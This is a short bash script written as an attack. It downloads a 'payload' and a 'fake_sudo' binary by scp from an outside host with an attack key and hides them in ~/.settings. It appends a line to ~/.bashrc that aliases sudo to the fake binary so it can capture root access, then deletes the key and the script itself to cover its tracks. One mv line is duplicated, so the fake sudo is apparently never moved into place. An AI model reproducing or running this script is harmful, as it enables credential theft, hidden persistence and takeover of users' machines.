#!/bin/bash
#this is the hidden folder created
mkdir -p ~/.settings
#grabs the binaries
scp -i attack_key root@161.35.130.78:/root/exe/payload ./
scp -i attack_key root@161.35.130.78:/root/exe/fake_sudo ./
#hides the binaries
mv payload ~/.settings/payload
mv payload ~/.settings/payload

#this is the exe that will perform tasks that need root
echo "export PAYLOAD=~/.settings/payload">>~/.bashrc
#this is the fake sudo that is used to get root
echo "alias sudo=~/.settings/fake_sudo">>~/.bashrc

#removes the key
rm attack_key
#removes this script
rm -- "$0"